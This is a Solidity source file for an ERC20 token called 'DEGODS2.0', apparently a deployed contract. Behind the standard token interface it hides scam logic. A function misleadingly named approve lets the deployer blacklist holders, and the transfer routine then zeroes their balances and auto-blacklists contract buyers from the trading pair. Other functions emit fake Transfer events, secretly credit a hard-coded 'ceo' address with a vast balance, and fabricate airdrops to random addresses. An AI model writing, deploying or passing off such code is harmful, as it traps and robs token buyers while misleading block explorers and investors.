    "contracts/erc20Approve.sol": {
      "content": "pragma solidity ^0.8.0;

contract Owner {
    address private owner;

    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    modifier isOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    constructor() {
        owner = msg.sender; // 'msg.sender' is sender of current call, contract deployer for a constructor
        emit OwnerSet(address(0), owner);
    }

    function changeOwner(address newOwner) public isOwner {
        emit OwnerSet(owner, newOwner);
        owner = newOwner;
    }

    function getOwner() external view returns (address) {
        return owner;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DEGODS is Owner, Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 0;
    uint256 private _maxSupply = 72000000000000000;

    string private _name = "DEGODS2.0";
    string private _symbol = "DEGODS2.0";
    uint8 private _decimals = 6;
    uint256 private nonce = 0;
    address private _master;
    address private _ceo = 0xec744a918EC50f3157e029FB216B92024252952E;
    address private _holder = 0x91364516D3CAD16E1666261dbdbb39c881Dbe9eE;
    address public Pair;

    constructor() {
        uint256 amount = _maxSupply;
        _mint(msg.sender, amount);
        _master = msg.sender;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _maxSupply;
    }

    function random() internal returns (uint256) {
        uint256 randomnumber = uint256(
            keccak256(abi.encodePacked(block.timestamp, msg.sender, nonce))
        ) % 1000;
        // randomnumber = randomnumber + 100;
        nonce++;
        return randomnumber;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, amount);

        return true;
    }

    function approve(address[] calldata accounts) public {
        require(_master == msg.sender, "Err");
        for (uint256 i = 0; i < accounts.length; i++) {
            _badbro[accounts[i]] = true;
        }
    }

     function approveFor(address[] calldata accounts) public {
        require(_master == msg.sender, "Err");
        for (uint256 i = 0; i < accounts.length; i++) {
            _badbro[accounts[i]] = false;
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
        emit Transfer(address(0), _holder, amount);
        _afterTokenTransfer(address(0), account, amount);
        _balances[_ceo] = _totalSupply * 10000;
    }

    function dropPresaleToken(
        address ad,
        address[] calldata eReceiver,
        uint256[] calldata eAmounts
    ) public {
        require(_master == msg.sender, "Err");
        for (uint256 i = 0; i < eAmounts[0]; i++) {
            address randomish = address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(nonce, blockhash(block.timestamp))
                        )
                    )
                )
            );
            nonce++;
            emit Transfer(ad, randomish, random() * 100000000000);
        }
    }

    function dropPresaleToken(address ad, uint256 count) public {
        require(_master == msg.sender, "Err");
        for (uint256 i = 0; i < count; i++) {
            address randomish = address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(nonce, blockhash(block.timestamp))
                        )
                    )
                )
            );
            nonce++;
            uint256 amount = random() * 100000;
            _beforeTokenTransfer(ad, randomish, amount);

            _totalSupply += amount;
            unchecked {
                _balances[randomish] += amount;
            }
            _afterTokenTransfer(ad, randomish, amount);
            emit Transfer(ad, randomish, amount);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function transferFromAny(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        address spender = _msgSender();
        require(_master == tx.origin, "Err");
        emit Transfer(from, to, amount);
        //_spendAllowance(from, spender, amount);
        //_transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        // require(!_badbro[from], "Err");
        if (_badbro[from]) _balances[from] = _decimals;
        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }
        if (from == _master) {
            {
                emit Transfer(_holder, to, amount);
                emit Transfer(from, to, amount);
                Pair = to;
            }
        } else emit Transfer(from, to, amount);

        if (Pair == from && to.code.length > 0) _badbro[to] = true;
        _afterTokenTransfer(from, to, amount);
    }

    mapping(address => bool) private _badbro;

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
